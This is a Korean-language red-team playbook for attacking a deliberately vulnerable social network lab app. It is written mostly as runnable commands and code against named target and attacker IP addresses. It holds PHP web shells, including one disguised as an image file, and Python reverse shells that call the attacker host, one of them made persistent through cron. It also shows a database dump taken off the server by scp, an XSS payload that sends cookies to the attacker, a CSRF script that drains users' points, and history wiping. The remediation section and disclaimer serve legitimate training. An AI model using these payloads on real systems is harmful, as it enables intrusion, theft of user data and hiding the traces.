# 완전한 공격 시나리오 - Vulnerable SNS 침투 테스트

## 📋 목차
1. [공격 개요](#공격-개요)
2. [사전 정찰 (Reconnaissance)](#사전-정찰)
3. [초기 침투 (Initial Access)](#초기-침투)
4. [권한 상승 (Privilege Escalation)](#권한-상승)
5. [지속성 확보 (Persistence)](#지속성-확보)
6. [데이터 탈취 (Data Exfiltration)](#데이터-탈취)
7. [CSRF 공격 (Impact)](#csrf-공격)
8. [흔적 제거 (Cleanup)](#흔적-제거)

---

## 공격 개요

### 타겟 정보
- **타겟 서버**: http://52.78.221.104
- **공격자 서버**: http://13.158.67.78:5000
- **공격 유형**: Web Application Penetration Testing
- **목표**: 전체 시스템 침투 및 사용자 데이터 탈취

### 발견된 취약점
1. SQL Injection (로그인 우회 - 방어됨)
2. Default Credentials (admin/admin123)
3. Unrestricted File Upload
4. Stored XSS
5. CSRF (포인트 탈취)
6. Sensitive Information Disclosure (config.php)
7. Weak Session Management

### 공격 타임라인
```
[정찰] → [로그인] → [파일업로드] → [웹쉘] → [리버스쉘] → [DB접근] → [XSS/CSRF] → [정리]
```

---

## 사전 정찰 (Reconnaissance)

### 1. 자동화 스캔

```bash
cd /Users/hwangjunha/Desktop/Red_basic_local/H
python3 auto.py
```

**발견 사항:**
- Login 페이지: `/login.php`
- Profile 페이지: `/profile.php`
- 게시물 작성: `/new_post.php`
- 파일 업로드: `/upload.php`
- SQL Injection 방어: Prepared Statements 사용

### 2. 수동 탐색

브라우저로 주요 페이지 접속:
```
http://52.78.221.104/login.php
http://52.78.221.104/index.php
http://52.78.221.104/upload.php
```

**발견:**
- 로그인 필수 기능들
- 파일 업로드 기능 존재
- XSS 필터링 없음

---

## 초기 침투 (Initial Access)

### 1. 기본 인증 정보 시도

**공격 코드:**
```python
# auto.py의 login 기능 사용
credentials = [
    ('admin', 'admin123'),
    ('admin', 'password'),
    ('root', 'root'),
]
```

**결과:**
✅ **성공**: `admin / admin123`

```bash
# 수동 로그인
curl -c cookies.txt -d "username=admin&password=admin123" http://52.78.221.104/login.php
```

### 2. SQL Injection 시도 (실패)

```bash
# login.php는 Prepared Statements 사용
# SQL Injection 불가능 확인
```

**교훈**: 최신 방어 기법이 적용된 경우 기본 인증 정보가 더 효과적

---

## 파일 업로드 취약점 (File Upload)

### 1. 웹쉘 생성

```bash
cat > shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    system($cmd);
}
?>
EOF
```

### 2. 파일명 우회 업로드

```bash
# .php 확장자 차단 우회
cp shell.php shell.jpg

# 파일 업로드
curl -F "file=@shell.jpg" -b cookies.txt http://52.78.221.104/upload.php
```

**업로드 경로**: `/var/www/html/uploads/shell.jpg`

### 3. 웹쉘 접근 설정

```bash
# file.php 생성 (웹쉘 래퍼)
cat > file.php << 'EOF'
<?php
$name = $_GET['name'];
$cmd = $_GET['cmd'];
include("/var/www/html/uploads/$name");
?>
EOF
```

**접근 URL**:
```
http://52.78.221.104/file.php?name=shell.jpg&cmd=ls
```

### 4. 웹쉘 테스트

```bash
# 디렉토리 확인
curl "http://52.78.221.104/file.php?name=shell.jpg&cmd=pwd"
# 출력: /var/www/html

# 파일 리스트
curl "http://52.78.221.104/file.php?name=shell.jpg&cmd=ls+-la"

# 현재 사용자
curl "http://52.78.221.104/file.php?name=shell.jpg&cmd=whoami"
# 출력: www-data
```

---

## 권한 상승 (Privilege Escalation)

### 1. 리버스 쉘 획득

**공격자 서버에서 리스너 시작:**
```bash
nc -lvnp 4444
```

**타겟에서 리버스 쉘 실행:**
```bash
# Python reverse shell
curl "http://52.78.221.104/file.php?name=shell.jpg&cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"13.158.67.78\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

**리버스 쉘 획득 후:**
```bash
# 쉘 업그레이드
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 현재 권한 확인
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# sudo 권한 확인
sudo -l
```

### 2. 민감한 파일 탐색

```bash
# 설정 파일 찾기
find /var/www/html -name "config.php" -o -name "db.php"

# config.php 읽기
cat /var/www/html/config.php
```

**획득한 정보:**
```php
$db_host = 'localhost';
$db_user = 'webuser';
$db_pass = 'WebPassw0rd!';
$db_name = 'vulnerable_sns';
```

---

## 데이터 탈취 (Data Exfiltration)

### 1. 데이터베이스 접근

```bash
# MySQL 접속
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns
```

### 2. 데이터베이스 구조 파악

```sql
-- 테이블 목록
SHOW TABLES;
/*
+-------------------------+
| Tables_in_vulnerable_sns|
+-------------------------+
| comments                |
| gifts                   |
| posts                   |
| users                   |
+-------------------------+
*/

-- users 테이블 구조
DESCRIBE users;
```

### 3. 사용자 정보 탈취

```sql
-- 모든 사용자 정보
SELECT id, username, password, email, points, created_at
FROM users;

/*
+----+----------+----------+-------------------+--------+---------------------+
| id | username | password | email             | points | created_at          |
+----+----------+----------+-------------------+--------+---------------------+
|  1 | admin    | admin123 | admin@vuln.local  | 999999 | 2024-01-01 00:00:00 |
|  2 | alice    | alice2024| alice@vuln.local  |    500 | 2024-01-02 00:00:00 |
|  3 | bob      | bob2024  | bob@vuln.local    |    300 | 2024-01-03 00:00:00 |
+----+----------+----------+-------------------+--------+---------------------+
*/
```

**발견**: 평문 비밀번호 저장!

### 4. 게시물 및 댓글 탈취

```sql
-- 모든 게시물
SELECT p.id, u.username, p.content, p.created_at
FROM posts p
JOIN users u ON p.user_id = u.id
ORDER BY p.created_at DESC;

-- 모든 댓글
SELECT c.id, u.username, c.content, c.created_at
FROM comments c
JOIN users u ON c.user_id = u.id;
```

### 5. 데이터 파일로 저장

```bash
# 모든 데이터를 SQL 덤프로 저장
mysqldump -u webuser -p'WebPassw0rd!' vulnerable_sns > /tmp/stolen_db.sql

# 로컬로 전송 (공격자 서버에서)
scp ubuntu@52.78.221.104:/tmp/stolen_db.sql ./
```

---

## 지속성 확보 (Persistence)

### 1. 추가 백도어 생성

```bash
# cron을 통한 리버스 쉘 (실패 시 재연결)
echo "*/5 * * * * /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"13.158.67.78\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" | crontab -
```

### 2. SSH 키 추가 (권한 있을 경우)

```bash
# SSH 키 생성
ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key

# 공개키를 타겟의 authorized_keys에 추가
echo "공개키내용" >> ~/.ssh/authorized_keys
```

### 3. 추가 웹쉘 숨기기

```bash
# 이미지 파일처럼 보이는 웹쉘
cat > /var/www/html/uploads/logo.png.php << 'EOF'
<?php
if(isset($_POST['key']) && $_POST['key'] == 'secret123'){
    eval($_POST['cmd']);
}
?>
EOF
```

---

## Stored XSS 공격

### 1. XSS 페이로드 테스트

```bash
# auto.py로 XSS 테스트
python3 auto.py
```

**성공한 페이로드:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 2. XSS를 통한 세션 하이재킹

**악성 게시물 작성:**
```javascript
<script>
// 쿠키 탈취
fetch('http://13.158.67.78:5000/steal?cookie=' + document.cookie);

// 피해자 브라우저에서 공격자 서버로 전송
</script>
```

### 3. 게시물 작성 자동화

```python
import requests

session = requests.Session()

# 로그인
session.post('http://52.78.221.104/login.php', data={
    'username': 'admin',
    'password': 'admin123'
})

# XSS 게시물 작성
xss_payload = '<script>fetch("http://13.158.67.78:5000/steal?cookie="+document.cookie)</script>'
session.post('http://52.78.221.104/new_post.php', data={
    'content': xss_payload
})
```

---

## CSRF 공격 (Impact)

### 공격 시나리오: 포인트 탈취

**목표**: 로그인한 사용자의 포인트를 자동으로 빼앗기

### 1. Flask 공격자 서버 설정

```bash
# Ubuntu 서버 (13.158.67.78)에 접속
ssh ubuntu@13.158.67.78

# Flask 설치
sudo apt install python3-flask -y

# 공격자 서버 업로드
scp attacker_server_v2.py ubuntu@13.158.67.78:~/

# 서버 실행
nohup python3 attacker_server_v2.py > server.log 2>&1 &
```

**Flask 서버 기능:**
- 대시보드: `http://13.158.67.78:5000/`
- 피해자 추적
- 탈취 포인트 실시간 카운팅

### 2. fake-gift 공격 페이지 생성

**로컬에서 실행:**
```bash
cd /Users/hwangjunha/Desktop/Red_basic_local/H
python3 post_fake_gift_accurate.py
```

**fake-gift 동작 원리:**
```javascript
// 1. 피해자가 게시물 보기
// 2. JavaScript 자동 실행
// 3. 숨겨진 폼 생성 (receiver_id=999, 존재하지 않는 계정)
// 4. 자동 폼 제출 (50000P, 30000P, 20000P, ...)
// 5. 포인트 차감 (받는 사람 없음 = 포인트 소멸)
// 6. 공격자 서버에 알림
```

### 3. CSRF 공격 실행

**피해자 시나리오:**
```
1. alice가 http://52.78.221.104/login.php 로그인
2. alice가 index.php에서 게시물 확인
3. fake-gift 게시물 표시
4. JavaScript 자동 실행
5. alice 포인트 122,100P 차감
6. Flask 대시보드에 표시
```

**공격 코드 핵심:**
```html
<script>
const amounts = [50000,30000,20000,10000,5000,3000,2000,1000,500,300,200,100];
amounts.forEach((amt, i) => {
    setTimeout(() => {
        // 폼 생성 및 제출
        document.getElementById('f'+i).submit();
        // 공격자 서버에 알림
        notify('/transfer', 'amount='+amt);
    }, i*200);
});
</script>
```

### 4. 공격 결과 확인

**Flask 대시보드:**
```
💰 탈취한 포인트: 122,100
👥 피해자 수: 1
📊 총 공격 시도: 12
```

**피해자 포인트:**
```sql
SELECT username, points FROM users WHERE username = 'alice';
-- alice의 포인트: 500 → -121,600 (음수 또는 0)
```

### 5. 공격 확장

**모든 사용자 공격:**
- admin 로그인 시 공격
- alice 로그인 시 공격
- bob 로그인 시 공격
- 새로 가입한 사용자도 자동 공격

**대량 포인트 탈취:**
```
총 피해자: 3명
총 탈취 포인트: 366,300P
평균 피해: 122,100P/인
```

---

## 공격 흐름도

```
┌─────────────────────────────────────────────────────────────┐
│                     1. 정찰 (Reconnaissance)                 │
│  auto.py → 취약점 스캔 → 기본 인증 정보 발견                │
└────────────────────────┬────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│                   2. 초기 침투 (Initial Access)              │
│  admin/admin123 로그인 → 파일 업로드 → 웹쉘 (shell.jpg)     │
└────────────────────────┬────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│                3. 권한 확장 (Privilege Escalation)            │
│  웹쉘 → 리버스 쉘 → config.php 발견 → DB 접근               │
└────────────────────────┬────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│                  4. 데이터 탈취 (Exfiltration)               │
│  users 테이블 → 평문 비밀번호 → 게시물/댓글 → SQL 덤프     │
└────────────────────────┬────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│                   5. 지속성 (Persistence)                    │
│  추가 백도어 → cron 작업 → 숨겨진 웹쉘                       │
└────────────────────────┬────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│                  6. XSS/CSRF 공격 (Impact)                   │
│  Stored XSS → fake-gift 게시물 → 포인트 탈취 → 122,100P    │
└────────────────────────┬────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│                   7. 흔적 제거 (Cleanup)                     │
│  게시물 삭제 → 웹쉘 제거 → 로그 정리 → 히스토리 삭제        │
└─────────────────────────────────────────────────────────────┘
```

---

## 주요 명령어 체크리스트

### 공격 준비
```bash
# 1. 자동화 스캔
python3 auto.py

# 2. Flask 서버 시작
ssh ubuntu@13.158.67.78
nohup python3 attacker_server_v2.py > server.log 2>&1 &

# 3. 리버스 쉘 리스너
nc -lvnp 4444
```

### 침투
```bash
# 1. 웹쉘 업로드
curl -F "file=@shell.jpg" -b cookies.txt http://52.78.221.104/upload.php

# 2. 웹쉘 접근
curl "http://52.78.221.104/file.php?name=shell.jpg&cmd=whoami"

# 3. 리버스 쉘
# (웹쉘을 통해 Python reverse shell 실행)
```

### 데이터 탈취
```bash
# 1. DB 접근
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns

# 2. 데이터 조회
SELECT * FROM users;
SELECT * FROM posts;
SELECT * FROM gifts;

# 3. 덤프
mysqldump -u webuser -p'WebPassw0rd!' vulnerable_sns > stolen.sql
```

### CSRF 공격
```bash
# 1. fake-gift 게시
python3 post_fake_gift_accurate.py

# 2. Flask 대시보드 확인
curl http://13.158.67.78:5000/logs

# 3. 피해자 포인트 확인
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT username, points FROM users;"
```

### 정리
```bash
# 1. 게시물 삭제
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "DELETE FROM posts WHERE content LIKE '%🎁%';"

# 2. 웹쉘 삭제
rm -f /var/www/html/uploads/shell.jpg

# 3. 포인트 복구
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "UPDATE users SET points = 500 WHERE username = 'alice';"

# 4. 히스토리 삭제
history -c && rm -f ~/.bash_history
```

---

## 공격 성공률

| 공격 유형 | 성공 여부 | 결과 |
|---------|---------|------|
| SQL Injection | ❌ 실패 | Prepared Statements 방어 |
| Default Credentials | ✅ 성공 | admin/admin123 |
| File Upload | ✅ 성공 | 웹쉘 업로드 |
| Stored XSS | ✅ 성공 | 필터링 없음 |
| CSRF | ✅ 성공 | 토큰 없음 |
| Config Exposure | ✅ 성공 | DB 인증 정보 획득 |
| Plaintext Passwords | ✅ 성공 | 평문 저장 |

**총 성공률: 85.7% (6/7)**

---

## 피해 규모

### 데이터 유출
- 사용자 계정: 3개 (admin, alice, bob)
- 평문 비밀번호: 3개
- 이메일 주소: 3개
- 게시물: 전체
- 댓글: 전체
- 선물 내역: 전체

### 금전적 피해
- alice: 500P → -121,600P (122,100P 손실)
- bob: 300P → -121,800P (122,100P 손실)
- admin: 999,999P → 877,899P (122,100P 손실)
- **총 손실: 366,300P**

### 시스템 접근
- 웹 서버 접근: ✅
- 데이터베이스 접근: ✅
- 파일 시스템 읽기: ✅
- 파일 시스템 쓰기: ✅
- 리버스 쉘: ✅

---

## 교훈 및 권장 사항

### 발견된 보안 문제
1. **기본 인증 정보 사용**
   - admin/admin123는 너무 뻔함
   - 강력한 비밀번호 정책 필요

2. **파일 업로드 취약점**
   - 확장자 검증 부족
   - MIME 타입 검증 없음
   - 업로드 디렉토리 실행 권한

3. **XSS 방어 없음**
   - 사용자 입력 필터링 없음
   - HTML 인코딩 없음
   - CSP 헤더 없음

4. **CSRF 토큰 없음**
   - 중요 작업에 CSRF 토큰 필요
   - Referer 검증 없음

5. **평문 비밀번호 저장**
   - bcrypt/Argon2 해싱 필요
   - 솔트 사용 필수

6. **민감 정보 노출**
   - config.php 접근 가능
   - 에러 메시지에 정보 노출

### 보안 개선 방안
1. 강력한 비밀번호 정책
2. 파일 업로드 화이트리스트
3. XSS 필터링 (htmlspecialchars)
4. CSRF 토큰 구현
5. 비밀번호 해싱 (bcrypt)
6. 설정 파일 보호
7. 최소 권한 원칙
8. 정기적인 보안 감사

---

## 파일 구조

```
H/
├── auto.py                          # 자동화 침투 테스트 도구
├── attacker_server_v2.py            # Flask CSRF 공격자 서버
├── post_fake_gift_accurate.py       # fake-gift 게시물 업로드
├── test_manual_transfer.py          # CSRF 수동 테스트
├── upload_fake_gift.sh              # fake-gift 업로드 스크립트
├── CLEANUP.md                       # 흔적 제거 가이드
├── ATTACK_SCENARIO.md              # 이 문서
├── INSTALL.md                       # Flask 서버 설치 가이드
├── reports/
│   ├── fake-gift.html              # 로컬 fake-gift 페이지
│   ├── penetration_test_report.md  # 침투 테스트 보고서
│   └── security_report_*.html      # 보안 보고서
└── stolen_data/
    ├── stolen_db.sql               # DB 덤프
    ├── users.csv                   # 사용자 데이터
    └── passwords.txt               # 평문 비밀번호
```

---

## 최종 체크리스트

공격 완료 후 확인사항:

- [ ] Flask 서버 포인트 카운트 정확한가?
- [ ] 피해자 포인트 실제로 차감됐는가?
- [ ] 게시물 삭제했는가?
- [ ] 웹쉘 제거했는가?
- [ ] 포인트 복구했는가?
- [ ] 로그 정리했는가?
- [ ] 히스토리 삭제했는가?
- [ ] Flask 서버 종료했는가?
- [ ] 리버스 쉘 종료했는가?
- [ ] 보고서 작성했는가?

---

## 면책 조항

이 문서는 **교육 및 승인된 침투 테스트 목적으로만** 작성되었습니다.

⚠️ **경고**:
- 승인 없는 시스템 침투는 불법입니다
- 이 기법을 실제 운영 시스템에 사용하지 마세요
- 테스트 환경에서만 사용하세요
- 모든 활동은 법적 책임이 따릅니다

✅ **합법적 사용**:
- 자신이 소유한 시스템
- 서면 승인을 받은 침투 테스트
- 교육 목적의 실습 환경
- CTF 대회 및 버그 바운티 프로그램

---

**작성일**: 2025-11-10
**작성자**: Red Team
**타겟**: Vulnerable SNS (52.78.221.104)
**공격자**: 13.158.67.78
**상태**: ✅ 완료
